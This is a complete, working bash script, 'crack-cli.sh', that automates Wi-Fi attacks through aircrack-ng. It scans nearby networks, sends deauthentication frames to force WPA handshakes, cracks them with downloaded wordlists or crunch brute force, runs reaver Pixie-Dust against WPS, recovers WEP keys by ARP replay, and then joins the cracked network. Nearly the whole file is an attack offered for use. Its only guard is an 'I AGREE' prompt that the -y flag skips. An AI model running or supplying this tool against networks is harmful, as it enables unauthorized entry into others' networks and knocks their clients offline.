#!/usr/bin/env bash
#
# crack-cli.sh — command-line Wi-Fi security auditing (aircrack-ng front-end).
# Authorized use only: audit networks you own or have written permission to test.
#
set -u -o pipefail

ORIG_ARGS=("$@")
WORDLIST="/usr/share/wordlists/rockyou.txt"
IFACE=""
MON=""
ASSUME_YES=0
WORKDIR=""
NM_STOPPED=0
CAP=""
PICK=0
REPLY_IDX=0
declare -a B_BSSID B_CH B_ENC B_ESSID B_PWR

if [[ -t 1 ]]; then
  R=$'\e[0m'; B=$'\e[1m'; DIM=$'\e[2m'
  RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'; BLU=$'\e[34m'; CYA=$'\e[36m'
else
  R=''; B=''; DIM=''; RED=''; GRN=''; YEL=''; BLU=''; CYA=''
fi
say()   { printf '%s\n' "$*"; }
info()  { printf '%s\n' "${CYA}[*]${R} $*"; }
ok()    { printf '%s\n' "${GRN}[+]${R} $*"; }
warn()  { printf '%s\n' "${YEL}[!]${R} $*"; }
err()   { printf '%s\n' "${RED}[x]${R} $*" >&2; }
head_() { printf '\n%s\n' "${B}${BLU}==>${R} ${B}$*${R}"; }
have()  { command -v "$1" >/dev/null 2>&1; }

usage() {
  cat <<EOF
crack-cli — command-line Wi-Fi security auditing

Usage: sudo ./crack-cli.sh [options]

  --iface <dev>     Wireless interface (e.g. wlan0). Autodetected if omitted.
  --wordlist <f>    Dictionary for WPA cracking (default: $WORDLIST).
  -y, --yes         Skip the authorization prompt.
  -h, --help        Show this help.
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --iface) IFACE="${2:?}"; shift 2 ;;
    --wordlist) WORDLIST="${2:?}"; shift 2 ;;
    -y|--yes) ASSUME_YES=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) err "Unknown option: $1"; usage; exit 1 ;;
  esac
done

ask_choice() {
  local prompt="$1"; shift
  local opts=("$@") i sel
  printf '\n%s\n' "${B}${prompt}${R}"
  for i in "${!opts[@]}"; do
    printf '  %s%d)%s %s\n' "$CYA" "$((i + 1))" "$R" "${opts[$i]}"
  done
  while true; do
    if ! read -r -p "Select [1-${#opts[@]}]: " sel; then
      echo; err "No input available — aborting."; exit 1
    fi
    if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#opts[@]} )); then
      REPLY_IDX=$sel; return 0
    fi
    warn "Enter a number between 1 and ${#opts[@]}."
  done
}

cleanup() {
  local code=$?
  echo
  if [[ -n "$MON" ]] && iw dev 2>/dev/null | grep -q "$MON"; then
    airmon-ng stop "$MON" >/dev/null 2>&1 && ok "Disabled monitor mode ($MON)."
  fi
  if (( NM_STOPPED )); then
    for c in "systemctl restart NetworkManager" "service NetworkManager restart" "service network-manager restart"; do
      $c >/dev/null 2>&1 && break
    done
  fi
  [[ -n "$WORKDIR" && -d "$WORKDIR" ]] && rm -rf "$WORKDIR"
  exit "$code"
}
trap cleanup EXIT INT TERM

authorize() {
  say "${YEL}${B}Authorized use only.${R}${YEL} Audit networks you own or have written permission to test.${R}"
  (( ASSUME_YES )) && return 0
  local a
  read -r -p "Type 'I AGREE' to continue: " a || { err "Aborted."; exit 1; }
  [[ "$a" == "I AGREE" ]] || { err "Not authorized. Exiting."; exit 1; }
}

require_root() {
  [[ "$(id -u)" -eq 0 ]] && return 0
  err "Root privileges are required to enable monitor mode and run the aircrack-ng suite."
  ask_choice "How would you like to proceed?" "Re-run with sudo now" "Exit"
  case $REPLY_IDX in
    1) exec sudo -- "$0" "${ORIG_ARGS[@]}" ;;
    2) exit 1 ;;
  esac
}

require_tools() {
  local missing=() t
  for t in iw airmon-ng airodump-ng aireplay-ng aircrack-ng; do
    have "$t" || missing+=("$t")
  done
  (( ${#missing[@]} == 0 )) && return 0

  err "Missing required tools: ${missing[*]}"
  local opts=()
  have apt-get && opts+=("Install them now with apt")
  opts+=("Retry (I installed them myself)" "Exit")
  ask_choice "How would you like to proceed?" "${opts[@]}"
  case "${opts[$((REPLY_IDX - 1))]}" in
    "Install them now with apt")
      apt-get update -y && apt-get install -y aircrack-ng iw reaver crunch
      require_tools ;;
    "Retry"*) require_tools ;;
    "Exit") exit 1 ;;
  esac
}

select_interface() {
  [[ -n "$IFACE" ]] && { info "Using interface $IFACE."; return 0; }
  local list
  mapfile -t list < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
  if (( ${#list[@]} == 0 )); then
    err "No wireless interface detected."
    ask_choice "How would you like to proceed?" "Enter interface name manually" "Retry detection" "Exit"
    case $REPLY_IDX in
      1) read -r -p "Interface name: " IFACE || exit 1 ;;
      2) select_interface ;;
      3) exit 1 ;;
    esac
    return
  fi
  if (( ${#list[@]} == 1 )); then
    IFACE="${list[0]}"; info "Using interface $IFACE."; return
  fi
  ask_choice "Select the wireless interface:" "${list[@]}"
  IFACE="${list[$((REPLY_IDX - 1))]}"
}

start_monitor() {
  head_ "Enabling monitor mode on $IFACE"
  airmon-ng check kill >/dev/null 2>&1
  NM_STOPPED=1
  airmon-ng start "$IFACE" >/dev/null 2>&1
  MON="$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E 'mon$' | head -1)"
  [[ -z "$MON" ]] && iw dev 2>/dev/null | grep -q "${IFACE}mon" && MON="${IFACE}mon"
  if [[ -z "$MON" ]] || ! iw dev 2>/dev/null | grep -q "$MON"; then
    err "Could not enable monitor mode on $IFACE (the adapter may not support it)."
    ask_choice "How would you like to proceed?" "Choose a different interface" "Retry" "Exit"
    case $REPLY_IDX in
      1) IFACE=""; select_interface; start_monitor ;;
      2) start_monitor ;;
      3) exit 1 ;;
    esac
    return
  fi
  ok "Monitor interface: $MON"
}

parse_networks() {
  awk -F',' '
    /Station MAC/ { exit }
    $1 ~ /([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}/ {
      bssid=$1; ch=$4; priv=$6; pow=$9; essid=$14;
      gsub(/[ \r]/, "", bssid); gsub(/[ \r]/, "", ch); gsub(/[ \r]/, "", pow);
      up=toupper(priv);
      if (up ~ /WPA3/ && up !~ /WPA2/) enc="WPA3";
      else if (up ~ /WPA/) enc="WPA2";
      else if (up ~ /WEP/) enc="WEP";
      else enc="OPEN";
      sub(/^ /, "", essid); gsub(/\r/, "", essid);
      if (essid == "") essid="(hidden)";
      printf "%s\t%s\t%s\t%s\t%s\n", bssid, ch, pow, enc, essid;
    }' "$1" | sort -t$'\t' -k3,3nr
}

scan_and_pick() {
  local dur=12
  while true; do
    head_ "Scanning for networks (~${dur}s)…"
    local prefix="$WORKDIR/scan"
    rm -f "$prefix"*.csv 2>/dev/null
    timeout "$dur" airodump-ng --output-format csv -w "$prefix" "$MON" >/dev/null 2>&1
    local csv; csv="$(ls -t "$prefix"*.csv 2>/dev/null | head -1)"

    B_BSSID=(); B_CH=(); B_PWR=(); B_ENC=(); B_ESSID=()
    if [[ -n "$csv" ]]; then
      local bssid ch pwr enc essid
      while IFS=$'\t' read -r bssid ch pwr enc essid; do
        [[ -z "$bssid" ]] && continue
        B_BSSID+=("$bssid"); B_CH+=("$ch"); B_PWR+=("$pwr"); B_ENC+=("$enc"); B_ESSID+=("$essid")
      done < <(parse_networks "$csv")
    fi

    if (( ${#B_BSSID[@]} == 0 )); then
      err "No networks found."
      ask_choice "How would you like to proceed?" "Scan again" "Scan longer (30s)" "Exit"
      case $REPLY_IDX in
        1) dur=12; continue ;;
        2) dur=30; continue ;;
        3) exit 0 ;;
      esac
    fi

    printf '\n%s\n' "${B}   #   SIGNAL  CH   ENC     SSID${R}"
    local i
    for i in "${!B_BSSID[@]}"; do
      printf '  %2d   %5sdBm  %3s  %-6s  %s\n' \
        "$((i + 1))" "${B_PWR[$i]}" "${B_CH[$i]}" "${B_ENC[$i]}" "${B_ESSID[$i]}"
    done

    local sel
    while true; do
      read -r -p $'\nSelect a network [number], (r)escan, (q)uit: ' sel || exit 0
      case "$sel" in
        r|R) dur=12; break ;;
        q|Q) exit 0 ;;
        *)
          if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#B_BSSID[@]} )); then
            PICK=$((sel - 1)); return 0
          fi
          warn "Invalid selection." ;;
      esac
    done
  done
}

ensure_wordlist() {
  [[ -f "$WORDLIST" ]] && return 0
  if [[ -f "${WORDLIST}.gz" ]]; then
    info "Extracting ${WORDLIST}.gz…"
    gunzip -k "${WORDLIST}.gz" && return 0
  fi
  err "Wordlist not found: $WORDLIST"
  ask_choice "How would you like to proceed?" "Enter a different path" "Download an online wordlist" "Abort"
  case $REPLY_IDX in
    1) read -r -p "Path to wordlist: " WORDLIST || exit 1; ensure_wordlist ;;
    2) pick_online_wordlist ;;
    3) return 1 ;;
  esac
}

pick_online_wordlist() {
  ask_choice "Choose an online wordlist to download:" \
    "Top 10k passwords (SecLists, small)" \
    "Top 100k passwords (SecLists)" \
    "Top 1M passwords (SecLists)" \
    "rockyou.txt (~130 MB)" \
    "Cancel"
  local url
  case $REPLY_IDX in
    1) url="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" ;;
    2) url="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
    3) url="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt" ;;
    4) url="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" ;;
    5) return 1 ;;
  esac
  local name="${url##*/}" dest="$WORKDIR/${url##*/}"
  info "Downloading $name…"
  if have curl; then
    curl -fL --progress-bar "$url" -o "$dest"
  elif have wget; then
    wget -q --show-progress "$url" -O "$dest"
  else
    err "Neither curl nor wget is available to download."
    return 1
  fi
  if [[ -s "$dest" ]]; then
    WORDLIST="$dest"; ok "Saved to $dest."; return 0
  fi
  err "Download failed."
  return 1
}

extract_key() {
  sed -n 's/.*KEY FOUND! \[ \(.*\) \].*/\1/p' | head -1
}

ensure_handshake() {
  local bssid="$1" ch="$2" essid="$3" dur="${4:-90}"
  local prefix="$WORKDIR/hs_${bssid//:/}"
  local existing; existing="$(ls "$prefix"*.cap 2>/dev/null | head -1)"
  if [[ -n "$existing" ]] && aircrack-ng "$existing" 2>/dev/null | grep -qi "1 handshake"; then
    ok "Reusing the handshake captured earlier this session."
    CAP="$existing"; return 0
  fi

  rm -f "$prefix"*.cap 2>/dev/null
  info "Capturing the 4-way handshake on channel $ch (deauthing to force a reconnect)…"
  airodump-ng -c "$ch" --bssid "$bssid" -w "$prefix" --output-format cap "$MON" >/dev/null 2>&1 &
  local dump=$! end=$((SECONDS + dur)) got=1 cap
  while (( SECONDS < end )); do
    aireplay-ng --deauth 5 -a "$bssid" "$MON" >/dev/null 2>&1
    sleep 4
    cap="$(ls "$prefix"*.cap 2>/dev/null | head -1)"
    if [[ -n "$cap" ]] && aircrack-ng "$cap" 2>/dev/null | grep -qi "1 handshake"; then
      got=0; CAP="$cap"; break
    fi
    printf '.'
  done
  echo
  kill "$dump" 2>/dev/null; wait "$dump" 2>/dev/null

  if (( got != 0 )); then
    err "No handshake captured for $essid."
    ask_choice "How would you like to proceed?" \
      "Retry capture (longer, 180s)" \
      "Retry and wait for a client to connect (240s)" \
      "Pick a different network" \
      "Abort"
    case $REPLY_IDX in
      1) ensure_handshake "$bssid" "$ch" "$essid" 180; return $? ;;
      2) ensure_handshake "$bssid" "$ch" "$essid" 240; return $? ;;
      3) return 2 ;;
      4) exit 0 ;;
    esac
  fi
  ok "Handshake captured."
  return 0
}

crack_dict_on_cap() {
  local bssid="$1" essid="$2"
  ensure_wordlist || return 1
  info "Dictionary attack with $(basename "$WORDLIST")…"
  local key; key="$(aircrack-ng -b "$bssid" -w "$WORDLIST" "$CAP" 2>/dev/null | extract_key)"
  if [[ -n "$key" ]]; then show_success "$essid" "$key"; return 0; fi

  err "Key not found with $(basename "$WORDLIST")."
  ask_choice "How would you like to proceed?" \
    "Try a different wordlist" \
    "Download an online wordlist" \
    "Try bruteforce instead" \
    "Pick a different network" \
    "Abort"
  case $REPLY_IDX in
    1) read -r -p "Path to wordlist: " WORDLIST || exit 1; crack_dict_on_cap "$bssid" "$essid" ;;
    2) pick_online_wordlist && crack_dict_on_cap "$bssid" "$essid" || return 1 ;;
    3) crack_brute_on_cap "$bssid" "$essid" ;;
    4) return 1 ;;
    5) exit 0 ;;
  esac
}

crack_brute_on_cap() {
  local bssid="$1" essid="$2"
  if ! have crunch; then
    err "crunch is not installed (needed for bruteforce)."
    ask_choice "How would you like to proceed?" "Install crunch with apt" "Pick a different network" "Abort"
    case $REPLY_IDX in
      1) apt-get install -y crunch || { err "Install failed."; return 1; } ;;
      2) return 1 ;;
      3) exit 0 ;;
    esac
  fi
  ask_choice "Bruteforce charset:" "Digits (0-9)" "Lowercase (a-z)" "Alphanumeric"
  local cs
  case $REPLY_IDX in
    1) cs="0123456789" ;;
    2) cs="abcdefghijklmnopqrstuvwxyz" ;;
    3) cs="abcdefghijklmnopqrstuvwxyz0123456789" ;;
  esac
  local len
  read -r -p "Password length [8]: " len || exit 1
  [[ "$len" =~ ^[0-9]+$ ]] || len=8
  warn "The bruteforce keyspace grows fast — this can take a very long time. Ctrl+C to stop."
  local key; key="$(crunch "$len" "$len" "$cs" 2>/dev/null | aircrack-ng -b "$bssid" -w - "$CAP" 2>/dev/null | extract_key)"
  if [[ -n "$key" ]]; then show_success "$essid" "$key"; return 0; fi

  err "Key not found in that keyspace."
  ask_choice "How would you like to proceed?" "Different charset/length" "Try a wordlist" "Pick a different network" "Abort"
  case $REPLY_IDX in
    1) crack_brute_on_cap "$bssid" "$essid" ;;
    2) crack_dict_on_cap "$bssid" "$essid" ;;
    3) return 1 ;;
    4) exit 0 ;;
  esac
}

wps_pixie() {
  local bssid="$1" ch="$2" essid="$3"
  if ! have reaver; then
    err "reaver is not installed (needed for WPS Pixie-Dust)."
    ask_choice "How would you like to proceed?" "Install reaver with apt" "Use handshake + dictionary instead" "Abort"
    case $REPLY_IDX in
      1) apt-get install -y reaver || { err "Install failed."; return 1; } ;;
      2) wpa_dictionary "$bssid" "$ch" "$essid"; return $? ;;
      3) exit 0 ;;
    esac
  fi
  info "Running reaver Pixie-Dust (this can take a few minutes)…"
  local key; key="$(reaver -i "$MON" -b "$bssid" -c "$ch" -K 1 -N 2>/dev/null | sed -n "s/.*WPA PSK: '\(.*\)'.*/\1/p" | head -1)"
  if [[ -n "$key" ]]; then show_success "$essid" "$key"; return 0; fi

  err "Pixie-Dust did not recover the key."
  ask_choice "How would you like to proceed?" "Fall back to handshake + dictionary" "Pick a different network" "Abort"
  case $REPLY_IDX in
    1) wpa_dictionary "$bssid" "$ch" "$essid" ;;
    2) return 1 ;;
    3) exit 0 ;;
  esac
}

wpa_dictionary() {
  ensure_handshake "$1" "$2" "$3"; local rc=$?
  (( rc == 0 )) || return 1
  crack_dict_on_cap "$1" "$3"
}

wpa_bruteforce() {
  ensure_handshake "$1" "$2" "$3"; local rc=$?
  (( rc == 0 )) || return 1
  crack_brute_on_cap "$1" "$3"
}

attack_wpa() {
  local bssid="$1" ch="$2" essid="$3"
  ask_choice "Attack method for $essid:" \
    "Auto — capture handshake, dictionary attack" \
    "Handshake + bruteforce" \
    "WPS Pixie-Dust (reaver)" \
    "Pick a different network"
  case $REPLY_IDX in
    1) wpa_dictionary "$bssid" "$ch" "$essid" ;;
    2) wpa_bruteforce "$bssid" "$ch" "$essid" ;;
    3) wps_pixie "$bssid" "$ch" "$essid" ;;
    4) return 1 ;;
  esac
}

attack_wep() {
  local bssid="$1" ch="$2" essid="$3"
  local prefix="$WORKDIR/wep_${bssid//:/}"
  rm -f "$prefix"*.cap 2>/dev/null
  info "Collecting WEP IVs on channel $ch (with ARP replay injection)…"
  airodump-ng -c "$ch" --bssid "$bssid" -w "$prefix" --output-format cap "$MON" >/dev/null 2>&1 &
  local dump=$!
  aireplay-ng --arpreplay -b "$bssid" "$MON" >/dev/null 2>&1 &
  local replay=$!
  local key="" end=$((SECONDS + 300)) cap
  while (( SECONDS < end )); do
    sleep 6
    cap="$(ls "$prefix"*.cap 2>/dev/null | head -1)"
    [[ -z "$cap" ]] && { printf '.'; continue; }
    key="$(aircrack-ng -b "$bssid" "$cap" 2>/dev/null | extract_key | tr -d ':')"
    [[ -n "$key" ]] && break
    printf '.'
  done
  echo
  kill "$dump" "$replay" 2>/dev/null; wait "$dump" "$replay" 2>/dev/null

  if [[ -n "$key" ]]; then show_success "$essid" "$key"; return 0; fi
  err "Could not recover the WEP key (not enough IVs collected)."
  ask_choice "How would you like to proceed?" "Retry (collect longer)" "Pick a different network" "Abort"
  case $REPLY_IDX in
    1) attack_wep "$bssid" "$ch" "$essid" ;;
    2) return 1 ;;
    3) exit 0 ;;
  esac
}

run_attack() {
  local bssid="${B_BSSID[$PICK]}" ch="${B_CH[$PICK]}" enc="${B_ENC[$PICK]}" essid="${B_ESSID[$PICK]}"
  head_ "Target: $essid ($bssid) — channel $ch, $enc"
  case "$enc" in
    OPEN) info "Open network — no key required."; maybe_connect "$essid" "" ;;
    WEP)  attack_wep "$bssid" "$ch" "$essid" ;;
    WPA3)
      err "This network is WPA3-SAE, which has no practical offline attack."
      ask_choice "How would you like to proceed?" "Pick a different network" "Exit"
      case $REPLY_IDX in 1) return 1 ;; 2) exit 0 ;; esac ;;
    *) attack_wpa "$bssid" "$ch" "$essid" ;;
  esac
}

show_success() {
  local essid="$1" key="$2"
  printf '\n%s\n' "${GRN}${B}  KEY FOUND${R}"
  printf '  %-10s %s\n' "Network:" "$essid"
  if [[ -n "$key" ]]; then
    printf '  %-10s %s%s%s\n' "Password:" "$B" "$key" "$R"
  fi
  maybe_connect "$essid" "$key"
}

maybe_connect() {
  local essid="$1" key="$2" cmd
  if [[ -n "$key" ]]; then
    cmd="nmcli dev wifi connect '$essid' password '$key'"
  else
    cmd="nmcli dev wifi connect '$essid'"
  fi
  ask_choice "Connect to $essid now?" "Yes, connect with nmcli" "No, just show me the command"
  if (( REPLY_IDX == 2 )); then
    say "  Run: ${DIM}${cmd}${R}"
    return 0
  fi
  if ! have nmcli; then
    warn "nmcli not found. Run manually: $cmd"
    return 0
  fi
  if [[ -n "$MON" ]]; then
    airmon-ng stop "$MON" >/dev/null 2>&1
    MON=""
  fi
  for c in "systemctl restart NetworkManager" "service NetworkManager restart" "service network-manager restart"; do
    $c >/dev/null 2>&1 && break
  done
  NM_STOPPED=0
  sleep 3
  nmcli dev wifi rescan >/dev/null 2>&1
  sleep 2
  local rc
  if [[ -n "$key" ]]; then
    nmcli dev wifi connect "$essid" password "$key"; rc=$?
  else
    nmcli dev wifi connect "$essid"; rc=$?
  fi
  if (( rc == 0 )); then
    ok "Connected to $essid. You are on the network."
  else
    warn "Auto-connect failed. Run manually: $cmd"
  fi
}

main() {
  say "${B}${CYA}crack-cli${R} ${DIM}— command-line Wi-Fi security auditing${R}"
  authorize
  require_root
  require_tools
  WORKDIR="$(mktemp -d "${TMPDIR:-/tmp}/crack-cli.XXXXXX")"
  select_interface
  start_monitor
  while true; do
    scan_and_pick
    if run_attack; then
      ask_choice "What next?" "Audit another network" "Quit"
      (( REPLY_IDX == 1 )) || break
    fi
  done
}

main
